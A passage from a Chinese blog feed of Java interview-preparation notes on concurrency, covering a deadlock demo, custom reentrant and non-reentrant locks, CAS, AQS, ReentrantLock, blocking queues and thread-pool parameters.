class="keyword">class</span> <span class="title">DeadLock</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> String locka = <span class="string">"A"</span> ;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> String lockb = <span class="string">"B"</span> ;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">LockA</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">synchronized</span> (locka)&#123;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">            System.out.println(<span class="string">"entre the locka"</span>);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                Thread.sleep(<span class="number">2000</span>);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (InterruptedException e) &#123;</span><br><span class="line">                e.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">synchronized</span> (lockb)&#123;</span><br><span class="line">                System.out.println(<span class="string">"a 取 b"</span>);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">LockB</span><span class="params">()</span></span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">synchronized</span> (lockb)&#123;</span><br><span class="line">            System.out.println(<span class="string">"entre the lockb"</span>);</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">synchronized</span> (locka)&#123;</span><br><span class="line">            System.out.println(<span class="string">"b 取 a"</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span></span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="number">10</span>;i++)&#123;</span><br><span class="line"></span><br><span class="line">            System.out.println(i+<span class="number">1</span> + <span class="string">"次"</span>);</span><br><span class="line">            <span class="keyword">new</span> Thread(()-&gt;&#123;</span><br><span class="line">                DeadLock.LockA();</span><br><span class="line">            &#125;).start();</span><br><span class="line"></span><br><span class="line">            <span class="keyword">new</span> Thread(()-&gt;&#123;</span><br><span class="line">                DeadLock.LockB();</span><br><span class="line">            &#125;).start();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>改变运行策略，其实是线程A中syc获取了锁a，还要获取suob，这样子顺序执行下来是ok 的，就怕线程a获取了锁a后，线程b抢占获取了锁b，此使线程a还要锁b<br>就阻塞了，所以到了线程b又要获取锁a，那么就死锁了<br>解决方法也简单，就是让一个锁提早消失就好了，所以改变一下sychronize的次序，提早释放锁，就万事大吉了</p></blockquote><h3 id="死锁的四个条件"><a href="#死锁的四个条件" class="headerlink" title="死锁的四个条件"></a>死锁的四个条件</h3><blockquote><p>互斥条件：资源不能共享，只能由⼀个线程使⽤<br>请求与保持条件：线程已经获得⼀些资源，但因请求其他资源发⽣阻塞，对已经获得的资源保持不释放<br>不可抢占：有些资源是不可强占的，当某个线程获得这个资源后，系统不能强⾏回收，只能由线程使⽤完⾃⼰释放<br>循环等待条件：多个线程形成环形链，每个都占⽤对⽅申请的下个资源</p></blockquote><h2 id="重入锁和不可重入锁"><a href="#重入锁和不可重入锁" class="headerlink" title="重入锁和不可重入锁"></a>重入锁和不可重入锁</h2><h3 id="不可重入锁-1"><a href="#不可重入锁-1" class="headerlink" title="不可重入锁"></a>不可重入锁</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.runindark.crlock;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">BcrLock</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span>  <span class="keyword">boolean</span> flag = <span class="keyword">false</span> ;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span>  <span class="keyword">synchronized</span> <span class="keyword">void</span> <span class="title">lock</span><span class="params">()</span> <span class="keyword">throws</span> InterruptedException </span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (!flag)&#123;</span><br><span class="line">            System.out.println(<span class="string">"进入加锁"</span>);</span><br><span class="line">            flag = <span class="keyword">true</span> ;</span><br><span class="line">        &#125;<span class="keyword">else</span> &#123;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">while</span> (flag)&#123;</span><br><span class="line">                System.out.println(Thread.currentThread().getName() + <span class="string">"进入等待状态"</span>);</span><br><span class="line">                wait();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">synchronized</span> <span class="keyword">void</span>  <span class="title">unlock</span><span class="params">()</span></span>&#123;</span><br><span class="line"></span><br><span class="line">        System.out.println(<span class="string">"进入解锁"</span>);</span><br><span class="line">        notify();</span><br><span class="line">        flag = <span class="keyword">false</span> ;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.runindark.crlock;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.omg.Messaging.SYNC_WITH_TRANSPORT;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">TestMain</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> BcrLock bcrLock = <span class="keyword">new</span> BcrLock() ;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">methodA</span><span class="params">()</span></span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            bcrLock.lock();</span><br><span class="line">            System.out.println(<span class="string">"方法A加锁"</span> + bcrLock.flag);</span><br><span class="line"></span><br><span class="line">        &#125; <span class="keyword">catch</span> (InterruptedException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;<span class="keyword">finally</span> &#123;</span><br><span class="line">            bcrLock.unlock();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">methodB</span><span class="params">()</span></span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            bcrLock.lock();</span><br><span class="line">            System.out.println(<span class="string">"方法B加锁"</span> + bcrLock.flag);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (InterruptedException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;<span class="keyword">finally</span> &#123;</span><br><span class="line">            bcrLock.unlock();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span></span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">new</span> TestMain().methodA();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="重入锁-1"><a href="#重入锁-1" class="headerlink" title="重入锁"></a>重入锁</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.runindark.crlock;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> jdk.nashorn.internal.ir.Block;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">CrLock</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">boolean</span> islock = <span class="keyword">false</span> ;</span><br><span class="line">    <span class="keyword">public</span> String currentThread = <span class="keyword">null</span> ;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">synchronized</span> <span class="keyword">void</span> <span class="title">lock</span><span class="params">()</span> <span class="keyword">throws</span> InterruptedException </span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (currentThread==<span class="keyword">null</span>) &#123;</span><br><span class="line">            currentThread = Thread.currentThread().getName();</span><br><span class="line">        &#125;<span class="keyword">else</span> &#123;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (currentThread.equals(Thread.currentThread().getName()))&#123;</span><br><span class="line">                System.out.println(Thread.currentThread().getName() + <span class="string">"成功加锁"</span>);</span><br><span class="line">            &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">while</span> (!currentThread.equals(Thread.currentThread().getName()))&#123;</span><br><span class="line">                    System.out.println(Thread.currentThread().getName() + <span class="string">"加锁失败"</span>);</span><br><span class="line">                    wait();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">synchronized</span> <span class="keyword">void</span> <span class="title">unlock</span><span class="params">()</span></span>&#123;</span><br><span class="line">        notify();</span><br><span class="line">        currentThread = <span class="keyword">null</span> ;</span><br><span class="line">        System.out.println(Thread.currentThread().getName() + <span class="string">"成功解锁"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.runindark.crlock;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> sun.awt.windows.ThemeReader;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">TestMainB</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> CrLock crLock = <span class="keyword">new</span> CrLock();</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">methodA</span><span class="params">()</span></span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            crLock.lock();</span><br><span class="line">            System.out.println(<span class="string">"方法A加锁"</span> + crLock.currentThread);</span><br><span class="line">            methodB();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (InterruptedException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;<span class="keyword">finally</span> &#123;</span><br><span class="line">            System.out.println(<span class="string">"方法a解锁"</span> );</span><br><span class="line">            crLock.unlock();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">methodB</span><span class="params">()</span></span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            crLock.lock();</span><br><span class="line">            System.out.println(<span class="string">"方法B加锁"</span>+ crLock.currentThread );</span><br><span class="line">        &#125; <span class="keyword">catch</span> (InterruptedException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;<span class="keyword">finally</span> &#123;</span><br><span class="line">            System.out.println(<span class="string">"方法b解锁"</span> );</span><br><span class="line">            crLock.unlock();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span></span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">new</span> Thread(()-&gt;&#123;</span><br><span class="line">            <span class="keyword">new</span> TestMainB().methodA();</span><br><span class="line">        &#125;).start();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">new</span> Thread(()-&gt;&#123;</span><br><span class="line">            <span class="keyword">new</span> TestMainB().methodA();</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="synchronized说说看"><a href="#synchronized说说看" class="headerlink" title="synchronized说说看"></a>synchronized说说看</h2><blockquote><p>非公平锁，原子性，可重入可以修饰代码块和方法<br>每个对象有⼀个锁和⼀个等待队列，锁只能被⼀个线程持有，其他需要锁的线程需要阻塞等待。锁被释放<br>后，对象会从队列中取出⼀个并唤醒，唤醒哪个线程是不确定的，不保证公平性<br>jdk6优化-&gt; 偏向锁-&gt;轻量级锁-&gt;重量级锁</p></blockquote><h2 id="CAS"><a href="#CAS" class="headerlink" title="CAS"></a>CAS</h2><h3 id="什么是CAS？"><a href="#什么是CAS？" class="headerlink" title="什么是CAS？"></a>什么是CAS？</h3><blockquote><p>CAS是一种乐观锁，CompareAndSwap，也就是比较再交换<br>执行过程大概如下： 首先是 内存地址V，预期原值A，新值B ， 如果线程A过来，V = A ,则满足条件把目标值更换成B，如果线程B过来，V ！= A，那么无法<br>将目标值更换成B，而且线程B将进行自旋，直到 A=V ，结束自旋，获取锁<br>缺点也将显而易见： 自旋锁的存在直接导致了cpu的消耗问题</p></blockquote><h3 id="ABA-问题由于CAS不保证原子性问题"><a href="#ABA-问题由于CAS不保证原子性问题" class="headerlink" title="ABA 问题由于CAS不保证原子性问题"></a>ABA 问题由于CAS不保证原子性问题</h3><blockquote><p>简单来说就是线程在操作过程中，有其它线程将该变量更改后，又有另一个线程把他改回来，到最开始线程操作的时候，发现该值没有变化，则该线程操作成<br>功。加一个版本号可以解决问题，每次修改时都要查看版本号</p></blockquote><h2 id="AQS"><a href="#AQS" class="headerlink" title="AQS"></a>AQS</h2><h3 id="什么是AQS"><a href="#什么是AQS" class="headerlink" title="什么是AQS"></a>什么是AQS</h3><blockquote><p>就是 java.util.concurrent (juc) 的一个工具包 全称是 AbstractQueuedSynchronizer  （抽象同步队列）<br>其中核心就是 一个int变量（用于表示同步状态），一个state（计数器），一个线程标记（谁加锁），一个阻塞队列（用于存储未拿到锁阻塞中的线程）</p></blockquote><h3 id="部分核心方法"><a href="#部分核心方法" class="headerlink" title="部分核心方法"></a>部分核心方法</h3><h3 id="acquire-int-arg-源码讲解，好⽐加锁lock操作"><a href="#acquire-int-arg-源码讲解，好⽐加锁lock操作" class="headerlink" title="acquire(int arg) 源码讲解，好⽐加锁lock操作"></a>acquire(int arg) 源码讲解，好⽐加锁lock操作</h3><ol><li>tryAcquire()尝试直接去获取资源，如果成功则直接返回,AQS⾥⾯未实现但没有定义成<br>abstract，因为独占模式下只⽤实现tryAcquire-tryRelease，⽽共享模式下只⽤实现<br>tryAcquireShared-tryReleaseShared，类似设计模式⾥⾯的适配器模式</li><li>addWaiter() 根据不同模式将线程加⼊等待队列的尾部，有Node.EXCLUSIVE互斥模式、<br>Node.SHARED共享模式；如果队列不为空，则以通过compareAndSetTail⽅法以CAS将当前线程<br>节点加⼊到等待队列的末尾。否则通过enq(node)⽅法初始化⼀个等待队列</li><li>acquireQueued()使线程在等待队列中获取资源，⼀直获取到资源后才返回,如果在等待过程<br>中被中断，则返回true，否则返回false<h3 id="release-int-arg-源码讲解-好⽐解锁unlock"><a href="#release-int-arg-源码讲解-好⽐解锁unlock" class="headerlink" title="release(int arg)源码讲解 好⽐解锁unlock"></a>release(int arg)源码讲解 好⽐解锁unlock</h3>独占模式下线程释放指定量的资源，⾥⾯是根据tryRelease()的返回值来判断该线程是<br>否已经完成释放掉资源了；在⾃义定同步器在实现时，如果已经彻底释放资源(state=0)，要返回<br>true，否则返回false<br>unparkSuccessor⽅法⽤于唤醒等待队列中下⼀个线程</li></ol><h2 id="ReentrantLock实现原理"><a href="#ReentrantLock实现原理" class="headerlink" title="ReentrantLock实现原理"></a>ReentrantLock实现原理</h2><blockquote><p>实现大致的思路是和AQS是一致的，ReentrantLock的实现是分为公平锁和非公平锁的，其中上层Lock（Accquire），Unlock（Release）上层一致，唯独在释放的时候有一点区别，公平锁的实现是直接去队列中去找，看看队列中是否有等待，如果有等待的话则排队，无等待的话就直接给锁，对应的方法也就是TryAccquire（） ，而非公平锁则直接判断是不是符合获取锁的条件CompareAndState，如果符合直接给锁，如果不符合，则是按照公平锁的方法处理</p></blockquote><h2 id="ReentrantLock和synchronized区别是什么？"><a href="#ReentrantLock和synchronized区别是什么？" class="headerlink" title="ReentrantLock和synchronized区别是什么？"></a>ReentrantLock和synchronized区别是什么？</h2><ol><li>ReentrantLock和synchronized都是独占锁</li><li>synchronized：<blockquote><p>· 是悲观锁会引起其他线程阻塞，java内置关键字，<br>· ⽆法判断是否获取锁的状态，锁可重⼊、不可中断、只能是⾮公平<br>· 加锁解锁的过程是隐式的,⽤户不⽤⼿动操作,优点是操作简单但显得不够灵活<br>· ⼀般并发场景使⽤⾜够、可以放在被递归执⾏的⽅法上,且不⽤担⼼线程最后能否正确<br>释放锁<br>· synchronized操作的应该是对象头中mark word，参考原先原理图⽚</p></blockquote></li><li>ReentrantLock：<blockquote><p>· 是个Lock接⼝的实现类，是悲观锁，<br>· 可以判断是否获取到锁，可重⼊、可判断、可公平可不公平<br>· 需要⼿动加锁和解锁,且解锁的操作尽量要放在finally代码块中,保证线程正确释放锁<br>· 在复杂的并发场景中使⽤在重⼊时要却确保重复获取锁的次数必须和重复释放锁的次数⼀样，否则可能导致 其他线程⽆法获得该锁。<br>· 创建的时候通过传进参数true创建公平锁,如果传⼊的是false或没传参数则创建的是⾮公平锁<br>· 底层不同是AQS的state和FIFO队列来控制加锁</p></blockquote></li></ol><h2 id="ReentrantReadWriteLock-读写锁"><a href="#ReentrantReadWriteLock-读写锁" class="headerlink" title="ReentrantReadWriteLock 读写锁"></a>ReentrantReadWriteLock 读写锁</h2><blockquote><p>读写锁其实就是一个分离的ReentrantLock,由于ReentrantLock无论读或者写都是加锁的，但是读其实是安全的，盲目加锁只能过多的消耗资源，所以应该<br>只有写是独占锁，写则是排他锁，这样子才可以优化资源，流程一般是获取写锁，获取读锁，释放写锁，释放读锁。<br>虽然也是重入锁，但是写可以重入读或者写，但是读就只能重入读</p></blockquote><h2 id="阻塞队列BlockingQueue"><a href="#阻塞队列BlockingQueue" class="headerlink" title="阻塞队列BlockingQueue"></a>阻塞队列BlockingQueue</h2><blockquote><p>j.u.c包下的提供了线程安全的队列访问的接⼝，并发包下很多⾼级同步类的实现都是基于阻塞队列实现的<br>1、当阻塞队列进⾏插⼊数据时，如果队列已满，线程将会阻塞等待直到队列⾮满<br>2、从阻塞队列读数据时，如果队列为空，线程将会阻塞等待直到队列⾥⾯是⾮空的时候</p></blockquote><h3 id="ArrayBlockingQueue："><a href="#ArrayBlockingQueue：" class="headerlink" title="ArrayBlockingQueue："></a>ArrayBlockingQueue：</h3><blockquote><p>基于数组实现的⼀个阻塞队列，需要指定容量⼤⼩，FIFO先进先出顺序</p></blockquote><h3 id="LinkedBlockingQueue："><a href="#LinkedBlockingQueue：" class="headerlink" title="LinkedBlockingQueue："></a>LinkedBlockingQueue：</h3><blockquote><p>基于链表实现的⼀个阻塞队列，如果不指定容量⼤⼩，默认Integer.MAX_VALUE, FIFO先进先出顺序</p></blockquote><h3 id="PriorityBlockingQueue："><a href="#PriorityBlockingQueue：" class="headerlink" title="PriorityBlockingQueue："></a>PriorityBlockingQueue：</h3><blockquote><p>⼀个⽀持优先级的⽆界阻塞队列，默认情况下元素采⽤⾃然顺序升序排序，也可以⾃定义排序实现 java.lang.Comparable接⼝</p></blockquote><h3 id="DelayQueue："><a href="#DelayQueue：" class="headerlink" title="DelayQueue："></a>DelayQueue：</h3><blockquote><p>延迟队列，在指定时间才能获取队列元素的功能，队列头元素是最接近过期的元素，⾥⾯的对象必须实现 java.util.concurrent.Delayed 接⼝并实现<br>CompareTo和getDelay⽅法</p></blockquote><h3 id="ConcurrentLinkedQueue"><a href="#ConcurrentLinkedQueue" class="headerlink" title="ConcurrentLinkedQueue"></a>ConcurrentLinkedQueue</h3><blockquote><p>并发队列ConcurrentLinkedQueue是基于链表实现的⽆界线程安全队列，采⽤FIFO进⾏排序<br>保证线程安全的三要素：原⼦、有序、可⻅性<br>1、底层结构是Node，链表头部和尾部节点是head和tail，使⽤节点变量和内部类属性使⽤<br>volatile声明保证了有序和可⻅性<br>2、插⼊、移除、更新操作使⽤CAS⽆锁操作，保证了原⼦性</p></blockquote><h2 id="线程池"><a href="#线程池" class="headerlink" title="线程池"></a>线程池</h2><blockquote><p>提⾼系统资源的使⽤率，同时避免过多资源竞争，避免堵塞，且可以定时定期执⾏、单线程、并发数控制，配置任务过多任务后的拒绝策略等功能</p></blockquote><h3 id="线程池分类"><a href="#线程池分类" class="headerlink" title="线程池分类"></a>线程池分类</h3><h4 id="newFixedThreadPool"><a href="#newFixedThreadPool" class="headerlink" title="newFixedThreadPool"></a>newFixedThreadPool</h4><blockquote><p>⼀个定⻓线程池，可控制线程最⼤并发数</p></blockquote><h4 id="newCachedThreadPool"><a href="#newCachedThreadPool" class="headerlink" title="newCachedThreadPool"></a>newCachedThreadPool</h4><blockquote><p>⼀个可缓存线程池</p></blockquote><h4 id="newSingleThreadExecutor"><a href="#newSingleThreadExecutor" class="headerlink" title="newSingleThreadExecutor"></a>newSingleThreadExecutor</h4><blockquote><p>⼀个单线程化的线程池，⽤唯⼀的⼯作线程来执⾏任务</p></blockquote><h4 id="newScheduledThreadPool"><a href="#newScheduledThreadPool" class="headerlink" title="newScheduledThreadPool"></a>newScheduledThreadPool</h4><blockquote><p>⼀个定⻓线程池，⽀持定时/周期性任务执⾏</p></blockquote><h3 id="线程池踩坑"><a href="#线程池踩坑" class="headerlink" title="线程池踩坑"></a>线程池踩坑</h3><h4 id="推荐ThreadPoolExecutor的⽅式原因"><a href="#推荐ThreadPoolExecutor的⽅式原因" class="headerlink" title="推荐ThreadPoolExecutor的⽅式原因"></a>推荐ThreadPoolExecutor的⽅式原因</h4><ol><li>newFixedThreadPool和newSingleThreadExecutor:<blockquote><p>队列使⽤LinkedBlockingQueue，队列⻓度为 Integer.MAX_VALUE，可能造成堆积，导致OOM</p></blockquote></li><li>newScheduledThreadPool和newCachedThreadPool:         <blockquote><p>线程池⾥⾯允许最⼤的线程数是Integer.MAX_VALUE，可能会创建过多线程，导致OOM</p></blockquote><h3 id="核心参数"><a href="#核心参数" class="headerlink" title="核心参数"></a>核心参数</h3><h4 id="corePoolSize："><a href="#corePoolSize：" class="headerlink" title="corePoolSize："></a>corePoolSize：</h4><blockquote><p>核⼼线程数，线程池也会维护线程的最少数量，默认情况下核⼼线程会⼀直存活，即使没有任务也不会受存keepAliveTime控制<br>坑：在刚创建线程池时线程不会⽴即启动，到有任务提交时才开始创建线程并逐步线程数⽬达到corePoolSize</p></blockquote><h4 id="maximumPoolSize："><a href="#maximumPoolSize：" class="headerlink" title="maximumPoolSize："></a>maximumPoolSize：</h4><blockquote><p>线程池维护线程的最⼤数量，超过将被阻塞<br>坑：当核⼼线程满，且阻塞队列也满时，才会判断当前线程数是否⼩于最⼤线程数，才决定是否创建新线程</p></blockquote><h4 id="keepAliveTime："><a href="#keepAliveTime：" class="headerlink" title="keepAliveTime："></a>keepAliveTime：</h4><blockquote><p>⾮核⼼线程的闲置超时时间，超过这个时间就会被回收，直到线程数量等于corePoolSize</p></blockquote><h4 id="unit："><a href="#unit：" class="headerlink" title="unit："></a>unit：</h4><blockquote><p>指定keepAliveTime的单位，如TimeUnit.SECONDS、TimeUnit.MILLISECONDS</p></blockquote><h4 id="workQueue"><a href="#workQueue" class="headerlink" title="workQueue:"></a>workQueue:</h4><blockquote><p>线程池中的任务队列,常⽤的是 ArrayBlockingQueue、LinkedBlockingQueue、SynchronousQueue</p></blockquote><h4 id="threadFactory："><a href="#threadFactory：" class="headerlink" title="threadFactory："></a>threadFactory：</h4><blockquote><p>创建新线程时使⽤的⼯⼚</p></blockquote><h4 id="handler"><a href="#handler" class="headerlink" title="handler:"></a>handler:</h4><blockquote><p>RejectedExecutionHandler是⼀个接⼝且只有⼀个⽅法,线程池中的数量⼤于maximumPoolSize，对拒绝任务的处理策略，默认有4种策略AbortPolicy、<br>CallerRunsPolicy、DiscardOldestPolicy、DiscardPolicy</p></blockquote></li></ol><h2 id="ThreadLocal"><a href="#ThreadLocal" class="headerlink" title="ThreadLocal"></a>ThreadLocal</h2><p><a href="https://www.cnblogs.com/aspirant/p/8991010.html" target="_blank" rel="noopener">博文地址</a></p></the>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;excerpt in=&quot;&quot; index=&quot;&quot; |=&quot;&quot; 首页摘要=&quot;&quot;&gt;&lt;br&gt;别问 问就是为了面试豁出了老命&lt;br&gt;&lt;/excerpt&gt;&lt;/p&gt;
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>《天净沙·我·Java集合》  双非菜鸡奇葩，面试项目框架，java java，卑微学子去哪？</title>
    <link href="http://runindark.com/2020/03/05/2020%E6%98%A5%E6%8B%9B/%E6%88%91%E4%B8%BA%E9%98%BF%E9%87%8C-Java%E9%9B%86%E5%90%88/"/>
    <id>http://runindark.com/2020/03/05/2020春招/我为阿里-Java集合/</id>
    <published>2020-03-05T15:05:46.737Z</published>
    <updated>2020-06-28T01:43:26.138Z</updated>
    
